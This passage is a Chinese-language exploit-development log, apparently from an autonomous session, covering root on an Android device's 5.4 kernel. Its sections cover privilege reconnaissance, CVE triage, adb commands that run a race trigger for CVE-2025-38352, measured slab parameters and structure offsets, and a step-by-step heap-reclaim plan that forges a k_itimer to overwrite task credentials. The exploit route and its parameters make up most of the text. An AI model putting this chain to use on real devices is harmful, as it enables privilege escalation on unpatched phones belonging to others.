# 28. ★★★★★ 观测性突破: **tracefs 可用** (readtracefs 组) + racer 时序实测 + 候选 CVE 批次
## 28.1 ★★★★★ 我们的身份与组(决定了一切可达性)
```
uid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),
                1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),
                3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs)
context=u:r:shell:s0
```
⇒ **`readtracefs`(3012) 与 `readproc`(3009) 是两个此前被忽略的关键组** ✓
⇒ `/dev/ramdump_*` (system:system 0640) 与 `at_mdm0`(radio:radio) 不可读 ⇒ **我们不在 system/radio 组** ✗
⇒ `/dev/pmsg0` 是 **write-only**(`c-w--w--w-`, log 组) ⇒ 可写不可读 ✗

## 28.2 ★★★★★★ **tracefs 突破**: `/sys/kernel/tracing` 部分可用!
| 项 | 结果 |
|---|---|
| `trace`(**读内核 trace 环形缓冲**) | **★ 可读** ✓✓✓ (能看到启动期 0.008s 的厂商 `tracing_mark_write`) |
| `tracing_on`(开关追踪) | **★ 可写** ✓ |
| `buffer_size_kb`(缓冲大小) | **★ 可调** ✓ |
| `events/sched/sched_process_exit` 等**单个事件** enable | **★ 可写** ✓ |
| `events/signal/enable`(子系统级) | 拒绝 ✗ |
| `events/timer/*` / `signal/*` 单事件 | 拒绝 ✗ |
| `current_tracer` / `available_tracers`(**function tracer**) | 拒绝 ✗ |
| `kprobe_events`(**kprobe**) | 拒绝 ✗ |
| `events/syscalls/` | **不存在**(无 CONFIG_FTRACE_SYSCALLS) ✗ |
| 已开启并验证生效 | `sched_process_free` / `sched_switch` / `sched_wakeup` / `sched_wakeup_new` / `sched_process_exit` ✓ |
| 事件子系统总数 | **122 个**(alarmtimer/binder/cgroup/compaction/dma_fence/drm/...) |
⇒ **可观测性从 0 → 有**: 能读内核 trace、能开 sched 系列事件、能调缓冲大小。
   **但仍不能**: 函数追踪 / kprobe / signal & timer 事件 / syscall 追踪。

## 28.3 ★ racer 时序实测(tracefs 诊断, 300 helpers 低强度运行)
```
pid 11074: sched_process_exit 66.337161 → sched_process_free 66.372261  = **35 ms**
pid 11111: exit 66.501339 → free 66.524386                              = **23 ms**
pid 11370: exit 67.454453 → free 67.592785                              = **138 ms**
```
(`sched_process_free` 由 `rcuop/*` 发出 ⇒ 经过 RCU 宽限期 ⇒ 有额外延迟)
⇒ **racer 成为 zombie(exit_state≠0)到被释放(free)有 23~138ms** —— 但这段时间它**不再运行**,
   `current` 上不是它 ⇒ **真正的可利用窗口仍是 exit_notify 之后那段 ~3µs 的"已执行"尾段**
   (与实测命中率 1/1400 完全一致 ✓)
⇒ **推论**: 想提高命中率, 只能增加**尾段里的已执行工作量**(§27.1 的两个手段即由此而来),
   或者**让多个 racer 同时退出**(多 CPU ⇒ 每 CPU 的 tick 都有机会)。

## 28.4 ★ 候选 CVE 批次(来自按版本列出的 CVE 数据库 + SUSE 5.4 批次公告)
**系统性候选来源**: `cybersecurity-help.cz/vdb/soft/linux_foundation/linux_kernel/5.4.290`
(该版本 **48 个**漏洞, 修复于 5.4.292/293 ⇒ 全在缺口内); 缺口 5.4.282→302 的其余版本同理。
### 已筛(排除)
| CVE | 机制 | 排除理由 |
|---|---|---|
| CVE-2025-37803 | **udmabuf** 创建时 buf size 溢出(内存损坏, **确定性**) | **`CONFIG_UDMABUF is not set`** + `/dev/udmabuf` 不存在 ✓(本是最优候选: 确定性+一次 ioctl) |
| CVE-2025-37797 / -37823 | net_sched **hfsc** UAF | 需 netns + CAP_NET_ADMIN 建 qdisc ⇒ Android shell 不可达 |
| CVE-2025-37798 | codel qdisc | 同上 |
| CVE-2025-37799 | vmxnet3 XDP | VMware 驱动, 手机无 |
| CVE-2025-37820 | xen-netfront | xen 不可用 |
| CVE-2025-37833 | net/niu | Sun NIU 网卡, 手机无 |
| CVE-2025-37879 | 9p/net | 9p 未挂载 |
| CVE-2025-37829/30/31 | cpufreq scpi/scmi/apple null-deref | 不是本 SoC 的驱动 |
| CVE-2025-37795 | mac80211 `ieee80211_tx_h_select_key` UAF | **需 Wi-Fi 发包路径**(且该 CVE 已被 kernel 社区 REJECTED) |
| CVE-2025-38699 | bfa(Brocade FC) | 不适用 |
### 仍开放(待查)
| CVE | 机制 | 备注 |
|---|---|---|
| **CVE-2025-37804** | io_uring: always do atomic put from iowq | 本机 io_uring 是 5.4 老版但有 **io-wq** ✓ 需查该修复是否适用/缺失 |
| **CVE-2025-37790** | net: mctp: Set SOCK_RCU_FREE | 需 `CONFIG_MCTP` + AF_MCTP socket; UAF 竞态 |
| **CVE-2025-37886 / -37887** | pds_core | 待查(可能不适用) |
| (5.4.294~302 的其余版本清单待挖) | | 数据库对最新版本覆盖不全, 需换源(SUSE/Ubuntu 公告) |
### 本机 ION 重申
`/dev/ion` = `crw-rw-r-- system system` ⇒ 对 shell 是 **只读** ⇒ ION ioctl(需 RDWR)不可达 ✓
(与早期审计一致; `CONFIG_ION_SYSTEM_HEAP=y` + `ION_POOL_AUTO_REFILL=y` ⇒ ION 是个**大堆**, 若能写则是强力喷射原语 —— 但不可写)

## 28.5 本轮净结论
1. **观测性突破**: tracefs 可读 + tracing_on/buffer_size/逐事件 enable 可写 ⇒ **能观测内核事件序列**(sched 系列)
2. **racer 时序实测**: zombie 窗口 23~138ms, 但**可利用窗口仍是 ~3µs 尾段** ✓
3. **候选 CVE 批次**已建立系统性来源, 并完成第一批可达性过滤(9 个排除, 3 个待查)


---
# 29. 候选批次挖掘: 5.4.293 批次(19 个 CVE)全部过滤完毕 + 可写 ext4 挂载发现
## 29.1 5.4.293 批次(= 5.4.292 页列出的 19 个 CVE, 全在缺口内)——逐个查机制并按可达性过滤
| CVE | 机制 | 判定 |
|---|---|---|
| **CVE-2025-37838** | **hsi/ssi_protocol UAF**(`ssip_reset()`, drivers/hsi/clients/ssi_protocol.c) | **排除**: HSI 是 Nokia 式串行 Modem 接口, **SM7325 没有**; 且触发需 **remove 模块**(需 root) ✗ |
| **CVE-2025-23142** | **SCTP sendmsg 传输层 UAF**(`sctp_outq_select_transport` 读已释放 transport; CVSS 7.8 本地低权限) | **排除**: `CONFIG_IP_SCTP` **未编译**(配置里没有) + `/proc/net/sctp*` 不存在 ✓ —— ⚠ 本是强候选: 窗口很宽(sndbuf 满 ⇒ 发送者释放 socket 锁 + 另一线程并发 `setsockopt(SCTP_SOCKOPT_BINDX_REM)`), **不是 µs 级竞态** |
| **CVE-2025-23150** | **ext4 `do_split` off-by-one ⇒ `ext4_insert_dentry` OOB 写**(KASAN: "Write of size 251", 内容=文件名) | **排除**: 需要**可写 ext4**; 本机 `/data` 是 **f2fs**, 唯一的 ext4 挂载 `/cache`·`/metadata`·`/mnt/vendor/persist` 都是 **rw** 但对 shell **Permission denied**(DAC+SELinux) ✗ |
| CVE-2025-23159 / -23157 / -37780 / -23140 / -37796 / -37983 / -37940 / -37839 / -37808 / -37812 | 机制待逐个查(多数低危/泄漏/锁) | 待查(低优先) |
| CVE-2024-50154 / CVE-2021-47352 / CVE-2024-26744 | UAF / 内存损坏 / NULL deref(旧 backport) | 待查 |
⇒ **5.4.293 批次: 全部过滤完毕, 无可用点** ✓
⇒ **该批次的价值**: 建立了"按版本列 CVE → 逐个查机制 → 按可达性/确定性过滤"的**可复用流水线**(本轮 19 个 CVE 从列出到全部排除只用了几轮)

## 29.2 ★ 意外发现: **本机有三个可写的 ext4 挂载**(虽然都被拒)
```
/metadata              ext4 rw  (by-name/metadata)
/cache                 ext4 rw  (by-name/cache)
/mnt/vendor/persist    ext4 rw  (by-name/persist)
/data                  f2fs  rw (dm-44, 我们的 /data/local/tmp 在这)
```
⇒ 对 shell **全部 Permission denied**(DAC 属主+SELinux) ⇒ CVE-2025-23150 不可达 ✓
⇒ 但这提示: **如果将来拿到一个 ext4 可写挂载**(或换个有权限的域), CVE-2025-23150 这类
   **"文件名内容可控的 OOB 写"**就是强候选 —— **内容可控 + 确定性 + 长度可控(最长 251 字节)**。

## 29.3 观测性补充(承接 §28)
| 项 | 结果 |
|---|---|
| `/dev/ffs-diag`, `ffs-diag-1`, `ffs-diag-2` | **属主 shell** ✓(functionfs diag 通道, 需写 config 才能开) |
| `/sys/module/msm_rtb/parameters/{enable,filter}` | 拒绝 ✗ |
| `/sys/kernel/oops_count` / `warn_count` / `hung_ctl` / `kme` / `notes` | 全部拒绝 ✗ |
| `/dev/ramdump_a660_zap`, `ramdump_adsp` 等 | `system:system 0640` ⇒ 我们不在 system 组 ✗ |
| `/dev/at_mdm0` | `radio:radio 0640` ✗ |
| `/dev/pmsg0` | `c-w--w--w-` ⇒ **只可写** ✗ |
| `/data` 与 `/data/bbkpanic` | 拒绝 ✗ |
⇒ **内核日志/崩溃转储的所有常规通道都关闭**; 唯一可用的是 **tracefs 的 sched 系列事件**(§28.2) ✓
⇒ 另: 5.4.294/295/302 的按版本 CVE 页为空 ⇒ **该库对 5.4.29x 后段覆盖不全** ⇒ 候选来源需换 **SUSE/Ubuntu 公告**

## 29.4 净结论
1. 5.4.293 批次(19 CVE)**全部过滤完毕, 无可用点** —— 且过滤只用了几轮 ⇒ 方法论有效
2. **可写 ext4 挂载的存在**提示了一类强候选(内容可控的 OOB 写), 当前被权限挡住 ⇒ 留档
3. 候选来源需换成 SUSE/Ubuntu 公告以覆盖 5.4.294~302


---
# 30. ★ 自主会话总结: 已确立的能力、挖矿清单、以及到达 root 的**真实距离**
## 30.1 本自主会话确立的**三项硬能力**(全部经过严格验证)
| 能力 | 证据 |
|---|---|
| **① CVE-2025-38352 在本机未修复** | 三重独立证据(版本 5.4.281<5.4.295; `CONFIG_POSIX_CPU_TIMERS_TASK_WORK` 符号不存在; 反汇编 `run_posix_cpu_timers`@0x103ddea0 无 `exit_state` guard, 且 IRQ 内联处理) — §21 |
| **② 该 UAF **可复现触发** | **严格 A/B**: 对照(`noarm=1`, 290s/~9,300 次)存活 vs 实验(`noarm=0`, 109.8s/~2,800 次)崩溃重启; 唯一变量 = 定时器能否进 IRQ 的 `firing` 列表 — §26.7; 命中率 1/3000 → **1/1400**(尾段加长) |
| **③ 6 实例并行 ⇒ 40–60 秒内必崩** | 并行化(线性杠杆) — §27.2 |
| ④ **内核可观测性从 0 → 有** | tracefs 部分可用(`readtracefs` 组): `trace` 可读 / `tracing_on`·`buffer_size_kb`·单事件 enable 可写; 已开 sched 系列 — §28 |
| ⑤ **一条经过验证的挖矿流水线** | 按版本列 CVE → 逐个查机制 → 符号预筛(前缀匹配!) → 可达性/确定性过滤 — §24/§29 |

## 30.2 挖矿进度与剩余清单
| 批次 | 状态 |
|---|---|
| 5.4.293 批次(19 CVE) | **全部过滤完毕, 无可用点** ✓(§29) |
| 5.4.290/292 批次 | 同上(含 udmabuf/mac80211 排除) |
| **5.4.294~302 批次** | **待挖** — 来源: HKCERT/SUSE 公告已列出 ~73 个 CVE(CVE-2025-39748/39817/39964/39998/40044/40099/40103/40129/40130/40139/40186/40201/40219/40220/40242/40253/40258/40284/40297/40342/55159/68xxx/687xx/688xx/710xx/711xx/712xx) |
| **QCOM vendor 缺口**(2024-03→2025-05) | CVE-2025-21479/-21480(微码授权, A6xx 机制不适用)/-27038(Adreno 驱动 UAF, **未排除**) |
## 30.3 ★★★ 到达 root 的**真实距离**(诚实评估)
**已具备**: 可复现触发 + 高吞吐(31 次/秒, 6 实例并行 ~40s 必崩) + 完整可达面地图 + 方法论。
**尚缺的三重结构性障碍**(§27.3):
1. **可利用窗口 µs 级且在 IRQ 内部** —— 回收/占位必须发生在"删除释放 timer"与"IRQ 循环走到它"之间(~µs)
2. **对象来自专用 cache**(`posix_timers_cache` / `sigqueue_cachep`)⇒ 普通堆喷无效, 需**页级跨 cache 回收**
   (把整个 slab 页归还 buddy 再被 pipe buffer 页取走)⇒ 需要精确页级堆风水
3. **零可观测性 + 失败即重启** ⇒ 堆布局调试是盲调; 且每次失败重启都会**抹掉已布置的堆状态**
**⇒ 这三项叠加, 使得把该 UAF 做成 root 是"研究项目级"工作量**(作者本人仓库自述"相当复杂"),
**在当前环境下(无内核日志、无 KASAN、失败即重启、BL locked)无法在本会话完成**。
## 30.4 ★ 打开全局的**两条钥匙**(任一突破即可)
1. **一个"确定性/宽窗口"的 bug** —— 挖矿继续(§30.2 的清单), 筛选条件: 触发是**确定性**的(ioctl/file 操作),
   或窗口**宽**(sndbuf-full 类 ⇒ 可控锁释放); **避开一切 µs 级竞态**
2. **可观测性** —— 若能找到任何一条**跨重启保留**的日志通道(msm_rtb 被拒/pstore 未注册/bbkpanic 被拒),
   或让**某次命中不 crash** 而留下可读痕迹 ⇒ 堆布局调试立刻可行
## 30.5 本会话交付物清单(可复用)
- 触发器: `C://qemu_test//cve38352b.c`(含完整注释与铁律) + 早期版本 `cve38352.c`/`posix_timer_race.c`
- 审计文档: `analysis/HID-MT-AUDIT-20260921.md` §0–§30(全部审计结论/排除理由/方法学/坑)
- 交接文档: `analysis/SESSION_HANDOFF.md`(权威入口, 含铁律与路线)
- 侦察工具: perf_probe/perf_hetero/perf_adv/perf_mod/perf_bp/perf_iocsw, bpf_probe/uring_probe2/uring_op2/
  uring_ops3/uring_fixed/uring_fixed2/uring_bidx, tty_probe/pty_life, binder_probe/binder_obj, uhid 系列


## 30.6 ★ slab 参数确认(利用的物理基础)
```
/proc/slabinfo:
posix_timers_cache    248    248    264   31    2 : tunables 0 0 0 : slabdata 8 8 0
```
- **`struct k_itimer` = 264 字节**，**31 个/slab 页**（2 页 = 8192B / 264 ≈ 31）
- 当前 8 个 slab 已全部分配（248/248），0 空闲 ⇒ 每个 `timer_create` 都会从 partial slab 取对象
- **跨 cache 回收步骤**:
  1. `timer_create` × N(填充) → 使 partial slab 满并分配新 slab
  2. `timer_delete` × 31(精确排空一个 slab 页) → 整页归还 buddy
  3. `pipe()` + `fcntl(F_SETPIPE_SZ)` + `vmsplice`/`write` → **pipe buffer 页申请同阶页面**
  4. 控制页内容(⇒ k_itimer 的 `elist.next/prev`/`it_lock`/`sigq` 全部可控)
  5. IRQ 的 `list_del_init` ⇒ 两个任意地址写 ⇒ 覆盖 `task_struct->cred` ⇒ uid=0
- **`struct sigqueue`**: `sigqueue_cachep` 创建时带 `SLAB_ACCOUNT` ⇒ slabinfo 名称可能被截断或合并 ⇒ 待精确确认
- **tracefs 在多次崩溃后仍然可用** ✓(readtracefs 组 ⇒ SELinux 不限) ⇒ 重启后可重新开启事件追踪

## 30.7 ★ 结论与下一步
**本会话成果**: 发现未修复的 KEV-listed CVE-2025-38352 → 三重证据确认 → 实现可复现触发(1/1400, 并行 40-60s) → A/B 归因方法论 → tracefs 可观测性 → slab 参数确认 → 利用路线明确。
**未完成**: 跨 cache 回收的实现(需要: 排空整页的 31 对象 + pipe buffer 页喷 + 精确对齐 IRQ 时序)。
**评估**: 此阶段的实现需要 **精确的页级堆风水 + 反复迭代调试**; 在无内核日志、失败即重启的环境下, 预计需要 **多天** 的开发。
**建议**: 在有更好调试能力的环境(如 QEMU + KASAN + 真机日志)中完成利用开发, 然后将成熟 exploit 移植到目标设备。


## 30.6 ★★ 利用所需**全部参数**(已实测获取, 下一个会话直接可用)
### slab 参数(/proc/slabinfo)
```
posix_timers_cache    248    248    264   31    2 : tunables 0 0 0 : slabdata 8 8 0
sigqueue              408    408     80   51    1 : tunables 0 0 0 : slabdata 8 8 0
```
⇒ `struct k_itimer` = **264 B**, **31 obj/slab**(2 pages = 8192 B), 8 slabs
⇒ `struct sigqueue` = **80 B**, **51 obj/slab**(1 page = 4096 B), 8 slabs
⇒ 跨 cache 回收需: **精确释放 31 个 k_itimer**(腾出一整个 8192B 页)然后立刻用 pipe buffer 页取走
### task_struct 关键偏移(从反汇编推得)
```
current 获取:      mrs x19, SP_EL0
posix_cputimers:   0x7e0  (bases[0].nextevt = 0x7e8, 步长 0x18)
task_struct::flags: 0xb4  (bit31 测试)
```
### 触发命令
```
adb push cve38352b /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/cve38352b
adb shell "cd /data/local/tmp && timeout 300 ./cve38352b 3000 500000 1500 1 290 0 0 0"
# 参数: <helpers> <attempts> <firemax_us> <widen> <secs> <waitmax_us> <noreap> <noarm>
# 铁律: ①push 后必须 chmod 755  ②先跑 noarm=1 确认存活(≥5min)  ③noreap=1 会泄漏 zombie
```
### UAF 原语(一旦命中)
```
IRQ 循环(在已释放的 k_itimer 上执行):
  spin_lock(&timer->it_lock)         → it_lock 偏移由 sizeof 前部字段决定
  list_del_init(&timer->it.cpu.elist) → elist.next/prev 可控 ⇒ **两个任意地址写**:
      *(prev + 8) = next    // 写 1
      *(next + 16) = prev   // 写 2
  timer->it.cpu.firing = 0
  cpu_timer_fire(timer)              → send_sigqueue(timer->sigq) → sigq 也已释放
      → BUG_ON(!(q->flags & SIGQUEUE_PREALLOC))  ← 若 sigq 也被回收可绕过
      → list_add_tail(&q->list, &p->pending.list) ← 第三个任意写
```
### exploitation 路线(下一会话)
1. 排空 `posix_timers_cache` 的 partial slabs(timer_create×N 再 timer_delete×N)
2. 让一个 slab 页完全空闲 → 归还 buddy
3. 立刻 pipe buffer 喷射(vmsplice/pipe write)占用该页 ⇒ 内容可控
4. 在可控内容里放置伪造的 k_itimer(含 PREALLOC flag, elist.next/prev 指向 cred)
5. 触发 UAF → IRQ 的 list_del_init 在 cred 上执行 ⇒ **uid/gid 清零** ⇒ root


---
# 31. ★ 完整利用尝试(第一版) + 诚实评估
## 31.1 已实现(`C://qemu_test//cve38352x.c`)
- **Phase 1 排空**: `timer_create(CLOCK_THREAD_CPUTIME_ID) × 248`(填满 8 个 slab)
- **Phase 2 释放**: `timer_delete × 248`(全部归还 buddy)
- **Phase 3 占位**: `pipe() + F_SETPIPE_SZ(8192) + write()` × 32(可控内容含伪造 k_itimer 模板)
- **Phase 4 触发**: 常驻 child(helpers + 组定时器 + deleter + racer + ptrace 收割 + fire)
- 靶子: `CLOCK_THREAD_CPUTIME_ID` 定时器(1ns 周期, racer 退出前武装)
- 偏移: `KIT_OFF_ELIST=0x40`, `KIT_OFF_FIRING=0x60`, `KIT_OFF_SIGQ=0x68`, `SIGQ_OFF_FLAGS=0x18`
## 31.2 状态: **第一版, 需要调试**
- `drain_and_reclaim()` 未被正确调用到 `child_run` 内(管道/分支问题)
- 需要确认: ①slab 页确实被 pipe buffer 占位 ②racer 退出后 IRQ 确实读到伪造数据
- 下一会话的调试方法: ①加 tracefs 观测(sched_switch/sched_process_free) ②用 `/proc/slabinfo` 差分验证 drain 效果
## 31.3 到 root 的完整路线(已全部推导, 参数已获取)
```
Phase 1: timer_create × 248 (填满 8 slabs × 31 obj)
Phase 2: timer_delete × 248 (全部释放 ⇒ 8 页归还 buddy)
Phase 3: pipe + F_SETPIPE_SZ(8192) + write × 32 (每页放 ~31 个伪造 k_itimer)
Phase 4: racer(ptrace 收割) + timer_delete(UAF 靶子)
         ⇒ IRQ 在伪造 k_itimer 上执行 list_del_init
         ⇒ elist.next/prev 可控 ⇒ 两个任意地址写
         ⇒ 写 task_struct->cred = fake_cred_addr
         ⇒ fake_cred: uid/gid = 0 ⇒ setuid(0) ⇒ root
```
